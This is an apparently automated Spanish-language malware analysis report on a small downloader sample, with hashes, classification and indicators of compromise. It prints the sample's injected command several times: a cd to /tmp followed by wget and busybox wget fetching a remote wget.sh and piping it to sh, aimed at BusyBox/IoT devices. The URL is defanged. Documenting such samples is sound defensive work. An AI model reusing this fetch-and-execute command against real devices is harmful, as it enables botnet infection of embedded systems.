# 🧬 Payload Analysis

`99d43aafbbfc42def6428c15d7d2aaa8376f266c8e5778de2f4d42d4aec75d65`

## 📌 Resumen

Texto ASCII de 174 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `cd /tmp`
2. `wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `sh -s dir823x`
4. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `sh -s d` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/99d43aafbbfc42def6428c15d7d2aaa8376f266c8e5778de2f4d42d4aec75d65.md](../../../../../malware-like/oraculo/downloader/99d43aafbbfc42def6428c15d7d2aaa8376f266c8e5778de2f4d42d4aec75d65.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `99d43aafbbfc42def6428c15d7d2aaa8376f266c8e5778de2f4d42d4aec75d65`
- **SHA1:** `c9dc3882935988a00af3d9f9c2283d1901022227`
- **MD5:** `154d5958497068db9b3a5a5bed59bfbf`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 174 B |
| Entropía | 4.82 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
macaddr=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dir823x;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s d
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | macaddr=;cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dir823x;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s d | strings |
| hash | 99d43aafbbfc42def6428c15d7d2aaa8376f266c8e5778de2f4d42d4aec75d65 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
